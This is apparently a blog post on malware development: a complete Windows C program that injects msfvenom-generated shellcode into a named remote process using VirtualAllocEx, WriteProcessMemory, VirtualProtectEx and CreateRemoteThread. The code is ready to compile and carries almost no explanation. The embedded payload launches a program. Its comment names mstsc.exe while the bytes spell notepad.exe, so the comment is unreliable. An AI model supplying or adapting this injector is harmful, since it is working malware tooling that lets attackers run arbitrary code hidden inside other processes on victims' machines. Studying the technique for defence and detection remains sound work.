---
title: "Process Injection - Shellcode Injection"
date: 2026-06-19 00:00:00 +0100
categories: [Malware, Development]
tags:
  - malware
  - development
---

# Process Injection - Shellcode Injection


## ProcInject.c

```c
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <ctype.h>   // for tolower

/*
    msfvenom -p windows/x64/exec CMD=mstsc.exe EXITFUNC=thread -f c
*/

unsigned char shellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0x9b,0xdb,0x31,0xf0,0x41,
0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,
0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 };



SIZE_T shellcodeSize = sizeof(shellcode) - 1;  // Exclude null terminator

// Convert wide string to lowercase
void ToLowerW(LPWSTR str) {
    for (int i = 0; str[i]; i++) {
        str[i] = (WCHAR)tolower((char)str[i]);
    }
}

// Get process handle by name (case-insensitive)
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed: %lu\n", GetLastError());
        return FALSE;
    }

    PROCESSENTRY32W proc = { .dwSize = sizeof(PROCESSENTRY32W) };

    if (!Process32FirstW(hSnapshot, &proc)) {
        printf("[!] Process32FirstW Failed: %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        WCHAR lowerName[MAX_PATH] = { 0 };
        wcscpy_s(lowerName, MAX_PATH, proc.szExeFile);
        ToLowerW(lowerName);

        WCHAR lowerTarget[MAX_PATH] = { 0 };
        wcscpy_s(lowerTarget, MAX_PATH, szProcessName);
        ToLowerW(lowerTarget);

        if (wcscmp(lowerName, lowerTarget) == 0) {
            *dwProcessId = proc.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc.th32ProcessID);

            if (*hProcess == NULL) {
                printf("[!] OpenProcess Failed: %lu\n", GetLastError());
            }

            CloseHandle(hSnapshot);
            return TRUE;
        }

    } while (Process32NextW(hSnapshot, &proc));

    CloseHandle(hSnapshot);
    return FALSE;
}

// Inject shellcode
BOOL InjectRemoteProcess(HANDLE hProcess, unsigned char* pShellcode, SIZE_T sSize) {
    if (!pShellcode || sSize == 0) {
        printf("[!] Invalid shellcode or size\n");
        return FALSE;
    }

    PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pShellcodeAddress) {
        printf("[!] VirtualAllocEx Failed: %lu\n", GetLastError());
        return FALSE;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSize, &bytesWritten) ||
        bytesWritten != sSize) {
        printf("[!] WriteProcessMemory Failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] VirtualProtectEx Failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] Shellcode allocated at: %p\n", pShellcodeAddress);
    printf("[+] Press <Enter> to create remote thread...\n");
    getchar();

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);

    if (hThread == NULL) {
        printf("[!] CreateRemoteThread Failed: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] Injection successful! Thread created.\n");
    CloseHandle(hThread);
    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        wprintf(L"[!] Usage: %s <Process Name>\n", argv[0]);
        wprintf(L"Example: %s explorer.exe\n", argv[0]);
        return -1;
    }

    HANDLE hProcess = NULL;
    DWORD dwProcessId = 0;

    wprintf(L"[i] Searching for process: %s\n", argv[1]);

    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
        printf("[!] Process not found or access denied.\n");
        return -1;
    }

    wprintf(L"[+] Found process: %s (PID: %lu)\n", argv[1], dwProcessId);

    if (!InjectRemoteProcess(hProcess, shellcode, shellcodeSize)) {
        CloseHandle(hProcess);
        return -1;
    }

    printf("[+] Press <Enter> to exit\n");
    getchar();

    CloseHandle(hProcess);
    return 0;
}
```

